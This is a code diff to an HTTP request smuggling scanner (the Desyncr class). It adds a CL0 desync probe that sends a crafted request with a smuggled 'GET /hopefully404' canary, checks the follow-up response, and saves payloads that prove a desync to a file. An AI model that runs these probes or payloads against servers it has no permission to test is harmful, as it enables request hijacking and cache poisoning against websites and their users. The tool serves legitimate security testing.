@@ -146,12 +146,141 @@ class Desyncr():
 		
 		exec(script)
 			
+		if self._run_cl0_check() and self._exit_early:
+			if self._quiet:
+				sys.stdout.write("\r"+" "*100+"\r")
+			return
+
 		for mutation_name in mutations.keys():
 			if self._create_exec_test(mutation_name, mutations[mutation_name]) and self._exit_early:
 				break
 		
 		if self._quiet:
 			sys.stdout.write("\r"+" "*100+"\r")
+
+	def _pretty_print(self, name, dismsg):
+		spacing = 13
+		sys.stdout.write("\r"+" "*100+"\r")
+		msg = Style.BRIGHT + Fore.MAGENTA + "[%s]%s: %s" % \
+		(Fore.CYAN + name + Fore.MAGENTA, " "*(spacing-len(name)), dismsg)
+		sys.stdout.write(CF(msg + Style.RESET_ALL))
+		sys.stdout.flush()
+
+		if dismsg[-1] == "\n":
+			ansi_escape = re.compile(r'\x1B[@-_][0-?]*[ -/]*[@-~]')
+			plaintext = ansi_escape.sub('', msg)
+			if self._logh is not None:
+				self._logh.write(plaintext)
+				self._logh.flush()
+
+	def _write_payload(self, smhost, payload, ptype, name):
+		furl = smhost.replace('.', '_')
+		if (self.ssl_flag):
+			furl = "https_" + furl
+		else:
+			furl = "http_" + furl
+		if os.path.islink(sys.argv[0]):
+			_me = os.readlink(sys.argv[0])
+		else:
+			_me = sys.argv[0]
+		fname = os.path.realpath(os.path.dirname(_me)) + "/payloads/%s_%s_%s.txt" % (furl,ptype,name)
+		self._pretty_print("CRITICAL", "%s Payload: %s URL: %s\n" % \
+		(Fore.MAGENTA+ptype, Fore.CYAN+fname+Fore.MAGENTA, Fore.CYAN+self._url))
+		with open(fname, 'wb') as file:
+			file.write(bytes(str(payload),'utf-8'))
+
+	# ptype == 0 (Attack payload, follow-up timeout/mismatch could mean potential CL0 desync)
+	# ptype == 1 (Edgecase payload, expected to work)
+	def _check_cl0(self, ptype=0):
+		RN = "\r\n"
+		canary = "GET /hopefully404 HTTP/1.1" + RN + "X:"
+		cl0_payload = Payload()
+		if (self._vhost == ""):
+			cl0_payload.host = self._host
+		else:
+			cl0_payload.host = self._vhost
+		cl0_payload.method = self._method
+		cl0_payload.endpoint = self._endpoint
+		cl0_payload.header  = "__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/1.1" + RN
+		cl0_payload.header += "Host: __HOST__" + RN
+		cl0_payload.header += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36" + RN
+		cl0_payload.header += "Content-type: application/x-www-form-urlencoded; charset=UTF-8" + RN
+		cl0_payload.header += "Content-Length: __REPLACE_CL__" + RN
+
+		if len(self._cookies) > 0:
+			cl0_payload.header += "Cookie: " + ''.join(self._cookies) + RN
+
+		if not ptype:
+			cl0_payload.cl = len(canary) # front-end forwards the canary as the body
+			cl0_payload.body = canary
+		else:
+			cl0_payload.cl = 0
+			cl0_payload.body = ""
+
+		followup  = "GET %s?cb=%s HTTP/1.1" % (self._endpoint, str(random.random()).split('.')[1]) + RN
+		followup += "Host: %s" % (cl0_payload.host) + RN + RN
+
+		try:
+			web = EasySSL(self.ssl_flag)
+			web.connect(self._host, self._port, self._timeout)
+			web.send(str(cl0_payload).encode())
+			res_probe = web.recv_nb(self._timeout)
+			if res_probe is None:
+				web.close()
+				return (2, None, cl0_payload) # Return code 2 if the probe itself timed out
+			web.send(followup.encode())
+			res_follow = web.recv_nb(self._timeout)
+			web.close()
+			if res_follow is None:
+				return (1, None, cl0_payload) # Return code 1 if the follow-up timed out
+			if res_follow[9:12] != res_probe[9:12]:
+				return (1, res_follow, cl0_payload) # Follow-up got the smuggled response
+			return (0, res_follow, cl0_payload) # Return code 0 if no desync observed
+		except Exception as exception_data:
+			return (-1, None, cl0_payload) # Return code -1 if some except occured
+
+	def _run_cl0_check(self):
+		name = "CL0"
+		self._pretty_print(name, "Checking CL0...")
+		start_time = time.time()
+		cl0_res = self._check_cl0(0)
+		cl0_time = time.time()-start_time
+
+		if (cl0_res[0] == 1):
+			# Potential CL0 found
+			# Lets check the edge case to be sure
+			cl0_res2 = self._check_cl0(1)
+			if (cl0_res2[0] == 0):
+				dismsg = Fore.RED + "Potential CL0 Issue Found" + Fore.MAGENTA + " - " + Fore.CYAN + self._method + Fore.MAGENTA + " @ " + Fore.CYAN + ["http://","https://",][self.ssl_flag]+ self._host + self._endpoint + Fore.MAGENTA + " - " + Fore.CYAN + self._configfile.split('/')[-1] + "\n"
+				self._pretty_print(name, dismsg)
+
+				# Write payload out to file
+				self._write_payload(self._host, cl0_res[2], "CL0", "CL0")
+				return True
+			else:
+				# No edge behavior found
+				dismsg = Fore.YELLOW + "CL0 ISSUE ON BOTH ATTACK AND EDGE CASE" + ["\n", ""][self._quiet]
+				self._pretty_print(name, dismsg)
+
+		elif (cl0_res[0] == -1):
+			# ERROR
+			dismsg = Fore.YELLOW + "SOCKET ERROR" + ["\n", ""][self._quiet]
+			self._pretty_print(name, dismsg)
+
+		elif (cl0_res[0] == 0):
+			# No Desync Found
+			cl0_msg = (Fore.MAGENTA + " (CL0: " + Fore.CYAN +"%.2f" + Fore.MAGENTA + " - " + \
+			Fore.CYAN +"%s" + Fore.MAGENTA + ")") % (cl0_time, cl0_res[1][9:12].decode("utf-8","ignore"))
+
+			dismsg = Fore.GREEN + "OK" + cl0_msg + ["\n", ""][self._quiet]
+			self._pretty_print(name, dismsg)
+
+		elif (cl0_res[0] == 2):
+			# Disconnected
+			dismsg = Fore.YELLOW + "DISCONNECTED" + ["\n", ""][self._quiet]
+			self._pretty_print(name, dismsg)
+
+		return False
 
 	# ptype == 0 (Attack payload, timeout could mean potential TECL desync)
 	# ptype == 1 (Edgecase payload, expected to work)
@@ -199,37 +328,9 @@ class Desyncr():
 
 
 	def _create_exec_test(self, name, te_payload):
-		def pretty_print(name, dismsg):
-			spacing = 13
-			sys.stdout.write("\r"+" "*100+"\r")
-			msg = Style.BRIGHT + Fore.MAGENTA + "[%s]%s: %s" % \
-			(Fore.CYAN + name + Fore.MAGENTA, " "*(spacing-len(name)), dismsg)
-			sys.stdout.write(CF(msg + Style.RESET_ALL))
-			sys.stdout.flush()
-
-			if dismsg[-1] == "\n":
-				ansi_escape = re.compile(r'\x1B[@-_][0-?]*[ -/]*[@-~]')
-				plaintext = ansi_escape.sub('', msg)
-				if self._logh is not None:
-					self._logh.write(plaintext)
-					self._logh.flush()
-
-
+		pretty_print = self._pretty_print
 		def write_payload(smhost, payload, ptype):
-			furl = smhost.replace('.', '_')
-			if (self.ssl_flag):
-				furl = "https_" + furl
-			else:
-				furl = "http_" + furl
-			if os.path.islink(sys.argv[0]):
-				_me = os.readlink(sys.argv[0])
-			else:
-				_me = sys.argv[0]
-			fname = os.path.realpath(os.path.dirname(_me)) + "/payloads/%s_%s_%s.txt" % (furl,ptype,name)
-			pretty_print("CRITICAL", "%s Payload: %s URL: %s\n" % \
-			(Fore.MAGENTA+ptype, Fore.CYAN+fname+Fore.MAGENTA, Fore.CYAN+self._url))
-			with open(fname, 'wb') as file:
-				file.write(bytes(str(payload),'utf-8'))
+			self._write_payload(smhost, payload, ptype, name)
 
 		# First lets test TECL
 		pretty_print(name, "Checking TECL...")
